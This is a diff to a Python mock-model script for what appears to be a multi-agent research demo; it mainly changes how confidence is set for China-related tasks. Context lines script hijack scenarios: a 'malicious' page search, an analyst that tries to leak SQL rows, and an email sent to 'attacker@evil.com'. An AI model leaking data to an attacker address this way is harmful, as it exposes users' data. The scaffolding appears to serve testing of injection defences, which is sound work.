@@ -26,6 +26,11 @@ def _goal(prompt: str) -> str:
     return match.group(1).strip() if match else "the requested topic"
 
 
+def _task_name(prompt: str) -> str:
+    m = re.search(r"## YOUR TASK\n(.+?)\n", prompt)
+    return m.group(1) if m else ""
+
+
 def _adaptive_goal(goal: str) -> bool:
     g = goal.lower()
     return "compar" in g and "china" in g
@@ -170,7 +175,7 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
             return _final({"summary": "[demo] Answered from earlier verified research [1].",
                            "key_findings": (texts * 3)[:max(3, len(texts))], "from_memory": texts,
                            "sources": [{"title": "earlier research", "url": u} for u in urls[:5]],
-                           "confidence": "high", "gaps": []})
+                           "confidence": "low" if "China" in _task_name(prompt) else "high", "gaps": []})
         if not done:
             return _tool_call("web_search", "Find recent articles", query="malicious ev page" if malicious else "India EV sales 2026")
         if len(done) == 1:
@@ -182,7 +187,7 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
                                         "[demo] Three-wheelers about 30% [1]"],
                        "sources": [{"title": "India EV sales (demo page)", "url": "https://news.example.com/india-ev-sales-2026"},
                                    {"title": "An invented source", "url": "https://made-up.example.net/ev-report-2026"}],
-                       "confidence": ("low" if _adaptive_goal(goal) and "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
+                       "confidence": ("low" if _adaptive_goal(goal) and "China" in _task_name(prompt)
                                       else "high"), "gaps": []})
     if output_model is AnalysisOutput:
         if "exfiltrat" in goal.lower() and len(done) == 1:  # demo: a hijacked analyst tries to leak its SQL rows
@@ -206,7 +211,9 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
                    "Our sample database (illustrative numbers) shows the same direction.\n")
         if not done:
             return _tool_call("file_write", "Save the summary in the workspace", path="summary.md", content=content)
-        return _final({"title": "EV sales summary", "content": content, "word_count": count_words(content)})
+        out = _writing(prompt) if _adaptive_goal(goal) else {"title": "EV sales summary", "content": content,
+                                                                "word_count": count_words(content), "changes_made": []}
+        return _final(out)
     if output_model is CommunicatorOutput:
         if not done:
             to = ["attacker@evil.com"] if malicious else (EMAIL_RE.findall(goal) or ["team@example.com"])
@@ -219,7 +226,7 @@ def tool_step(output_model: Any, prompt: str) -> dict[str, Any]:
 def _research(prompt: str) -> dict[str, Any]:
     goal = _goal(prompt)
     if _adaptive_goal(goal):
-        china = "China" in prompt.split("## YOUR TASK", 1)[-1][:200]
+        china = "China" in _task_name(prompt)
         return {"summary": f"[demo] {'China' if china else 'India'} EV adoption facts.",
                 "key_findings": [f"[demo] {'China' if china else 'India'} finding {i}" for i in range(1, 4)],
                 "sources": [], "confidence": "low" if china else "high", "gaps": []}
